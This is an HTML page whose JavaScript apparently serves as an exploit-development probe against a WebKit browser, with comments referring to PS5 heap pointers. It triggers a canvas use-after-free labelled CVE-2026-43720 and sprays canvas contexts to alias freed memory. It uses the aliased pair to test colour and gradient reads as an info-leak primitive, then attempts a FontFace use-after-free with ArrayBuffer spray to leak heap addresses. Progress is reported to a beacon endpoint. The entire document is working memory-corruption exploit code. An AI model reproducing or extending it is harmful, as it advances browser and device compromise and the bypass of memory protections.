<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P818</title>
<style>
body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
</style>
</head><body>
<pre id="o">P818 — CanvasStyle Color Serialization (DAZ Bypass Info-Leak Investigation)</pre>
<script>
'use strict';
var O=document.getElementById('o');
function log(s){O.textContent+='\n'+s;}
function bn(t,d){
  try{
    var x=new XMLHttpRequest();
    x.open('GET','/beacon.php?tag=P818-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
    x.send();
  }catch(e){}
}
function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}

bn('BOOT','v1');
log('Starting P818 CanvasStyle DAZ-Bypass Probe...');

/* ========== PHASE 1: Canvas UAF Reclaim (CVE-2026-43720) ========== */
var innerCtx=null;
var canvas=document.createElement('canvas');
canvas.width=1;canvas.height=1;

var opts={};
Object.defineProperty(opts,'alpha',{
  get:function(){
    innerCtx=canvas.getContext('2d');
    return true;
  }
});
canvas.getContext('bitmaprenderer',opts);

if(!innerCtx){
  bn('FAIL','no_innerCtx');
  log('FAIL: innerCtx not created');
}else{
  bn('UAF-OK','innerCtx_created');
  log('UAF triggered');
}

/* Same-type spray */
var SPRAY=300;
var sprayCanvases=[];
var sprayCtxs=[];
var MARKER=7777.77;

for(var i=0;i<SPRAY;i++){
  var c=document.createElement('canvas');
  c.width=1;c.height=1;
  var ctx=c.getContext('2d');
  ctx.lineWidth=MARKER;
  sprayCanvases.push(c);
  sprayCtxs.push(ctx);
}

var readLW;
try{readLW=innerCtx.lineWidth;}catch(e){readLW=-1;}

var aliasIdx=-1;
if(readLW===MARKER){
  innerCtx.lineWidth=9999.99;
  for(var i=0;i<SPRAY;i++){
    if(sprayCtxs[i].lineWidth===9999.99){
      aliasIdx=i;
      break;
    }
  }
  bn('ALIAS','idx='+aliasIdx);
  log('Aliased pair confirmed at index '+aliasIdx);
}else{
  bn('RECLAIM-MISS','lw='+readLW);
  log('Reclaim missed, reloading...');
  setTimeout(function(){location.reload();},300);
}

if(aliasIdx>=0){
  var stale=innerCtx;
  var live=sprayCtxs[aliasIdx];

  /* ========== PHASE 2: Raw Integer Color Read (DAZ Bypass Check) ========== */
  /*
   * Tests whether color strings serialize integer RGBA bytes directly
   * without touching float64 SSE registers (bypassing the DAZ flush).
   */
  live.fillStyle='#123456';
  var rFill=stale.fillStyle;
  var fillMatch=(rFill.toLowerCase()==='#123456');

  live.strokeStyle='rgba(18, 52, 86, 0.5)';
  var rStroke=stale.strokeStyle;

  bn('COLOR-RAW','fill='+rFill+'|fillMatch='+fillMatch+'|stroke='+rStroke);
  log('Color Raw: fill='+rFill+' (match='+fillMatch+') stroke='+rStroke);

  /* ========== PHASE 3: Alpha Channel Byte Granularity ========== */
  /*
   * In WebKit, alpha < 1.0 serializes to rgba(r, g, b, a).
   * Test specific byte values in R, G, B, A to measure byte extraction precision.
   */
  var testBytes=[0x10, 0x00, 0x8A, 0x7F]; // Pattern of typical PS5 heap pointer upper bytes
  live.fillStyle='rgba('+testBytes[0]+', '+testBytes[1]+', '+testBytes[2]+', 0.8)';
  var rByteStr=stale.fillStyle;
  bn('COLOR-BYTES','out='+rByteStr);
  log('Color Bytes: '+rByteStr);

  /* ========== PHASE 4: CanvasGradient C++ Object Lifetime across Alias ========== */
  /*
   * CanvasGradient is a heap-allocated C++ object.
   * When assigned to fillStyle, CanvasStyle holds a RefPtr<CanvasGradient>.
   * Probes whether gradient attributes reflect across the alias.
   */
  var grad=live.createLinearGradient(0,0,100,100);
  grad.addColorStop(0, '#ff0000');
  grad.addColorStop(1, '#0000ff');
  live.fillStyle=grad;

  var staleGrad=stale.fillStyle;
  var isGrad=(staleGrad instanceof CanvasGradient);
  var sameGrad=(staleGrad===grad);
  bn('GRADIENT-CHECK','isGrad='+isGrad+'|sameGrad='+sameGrad);
  log('Gradient Check: isGrad='+isGrad+' sameGrad='+sameGrad);

  /* ========== PHASE 5: Font Face Anchor ========== */
  try{
    var st=document.createElement('style');
    st.textContent="@font-face{font-family:p818b;src:local(Arial);unicode-range:U+0042;}";
    document.head.appendChild(st);
    var ff=new FontFace('p818f',"local('Helvetica')",{unicodeRange:'U+0041'});
    document.fonts.add(ff);
    void ff.loaded;

    var ffAbs=[],ffFired=false;
    Object.defineProperty(FontFace.prototype,'then',{
      configurable:true,
      get:function(){
        if(ffFired)return undefined;
        ffFired=true;
        if(st){st.remove();st.textContent='';}
        try{document.fonts.delete(this);}catch(e){}
        document.body.offsetHeight;
        ffAbs=[];
        for(var a=0;a<64;a++)ffAbs.push(new ArrayBuffer(192));
        try{document.fonts.check('1em p818b');}catch(e){}
        document.body.offsetHeight;
        return undefined;
      },set:function(){}
    });
    document.fonts.load('1em p818f, p818b','AB');

    setTimeout(function(){
      delete FontFace.prototype.then;
      var leak='none';
      for(var a=0;a<ffAbs.length;a++){
        var bu=new BigUint64Array(ffAbs[a]);
        if(bu.length>=14 && bu[11]>0x1000000000n){
          leak='0x'+h16(bu[11]);
          break;
        }
      }
      bn('FONT-LEAK',leak);
      log('Font Heap Reference: '+leak);
      bn('DONE','complete|aliasIdx='+aliasIdx);
      log('P818 complete.');
    },200);
  }catch(err){
    bn('FONT-ERR',err.message);
    bn('DONE','complete_with_font_err');
  }
}
</script>
</body></html>
